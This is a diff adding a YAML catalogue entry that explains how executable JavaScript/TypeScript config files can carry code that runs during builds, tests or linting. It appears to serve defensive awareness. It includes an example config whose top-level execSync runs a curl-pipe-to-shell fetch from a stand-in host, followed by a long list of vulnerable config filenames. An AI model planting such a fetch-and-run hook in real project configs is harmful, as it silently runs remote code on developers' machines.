@@ -1,0 +1,113 @@
+name: JavaScript/TypeScript Config Files
+id: javascript-config-files
+description: >
+  Many developer tools load configuration from .js/.mjs/.cjs/.ts files. These files are not
+  passive data: they are executed by Node.js (or a runtime bridge) when the tool starts.
+  A malicious repository can hide payloads in config files that look like harmless object
+  exports, leading to local code execution during normal development workflows.
+author: LOC Team
+tags:
+  - javascript
+  - typescript
+  - config
+  - code-execution
+
+exploitation: |
+  Modern tooling frequently supports executable config files.
+
+  Because these are executable modules, any top-level statement runs as soon as the tool imports
+  the config. Attackers can abuse this by embedding payloads that execute before or while the
+  expected configuration object is returned.
+
+  Example:
+
+  ```js
+  // Looks like a normal tool config, but executes on load.
+  const { execSync } = require('node:child_process');
+  execSync('curl -fsSL https://example.com/payload | sh', { stdio: 'ignore' });
+
+  module.exports = {
+    plugins: []
+  };
+  ```
+
+  Common trigger points include running build, test, lint, format, docs, or dev-server commands
+  that auto-load project config. This means simple actions like `npm test`, `vite`, `eslint .`,
+  or opening a workspace that runs tasks can invoke malicious config code.
+
+
+  ### Common config filenames
+
+  - `webpack.config.js`
+  - `rollup.config.js`
+  - `vite.config.js`
+  - `vite.config.ts`
+  - `snowpack.config.js`
+  - `gulpfile.js`
+  - `Gruntfile.js`
+  - `metro.config.js`
+  - `tailwind.config.js`
+  - `postcss.config.js`
+  - `uno.config.js`
+  - `uno.config.ts`
+  - `windi.config.js`
+  - `next.config.js`
+  - `nuxt.config.js`
+  - `nuxt.config.ts`
+  - `svelte.config.js`
+  - `astro.config.mjs`
+  - `remix.config.js`
+  - `gatsby-config.js`
+  - `vue.config.js`
+  - `quasar.config.js`
+  - `app.config.js`
+  - `jest.config.js`
+  - `vitest.config.js`
+  - `vitest.config.ts`
+  - `playwright.config.js`
+  - `playwright.config.ts`
+  - `cypress.config.js`
+  - `karma.conf.js`
+  - `wdio.conf.js`
+  - `.mocharc.js`
+  - `stryker.conf.js`
+  - `eslint.config.js`
+  - `.eslintrc.js`
+  - `.prettierrc.js`
+  - `prettier.config.js`
+  - `.stylelintrc.js`
+  - `commitlint.config.js`
+  - `.lintstagedrc.js`
+  - `babel.config.js`
+  - `.babelrc.js`
+  - `.storybook/main.js`
+  - `styleguide.config.js`
+  - `.vuepress/config.js`
+  - `.eleventy.js`
+  - `eleventy.config.js`
+  - `.vitepress/config.js`
+  - `capacitor.config.js`
+  - `capacitor.config.ts`
+  - `electron-builder.js`
+  - `ecosystem.config.js`
+  - `docusaurus.config.js`
+  - `.sequelizerc`
+  - `drizzle.config.ts`
+  - `release.config.js`
+  - `.huskyrc.js`
+  - `renovate.config.js`
+  - `.size-limit.js`
+  - `lighthouserc.js`
+  - `knexfile.js`
+
+references:
+  - url: https://webpack.js.org/configuration/
+    description: Webpack configuration (JavaScript file)
+  - url: https://vite.dev/config/
+    description: Vite config loading from JS/TS modules
+  - url: https://eslint.org/docs/latest/use/configure/configuration-files
+    description: ESLint configuration files, including JavaScript
+  - url: https://jestjs.io/docs/configuration
+    description: Jest configuration via JavaScript/TypeScript files
+  - url: https://github.com/cosmiconfig/cosmiconfig
+    description: Cosmiconfig supports JavaScript config files in many tools
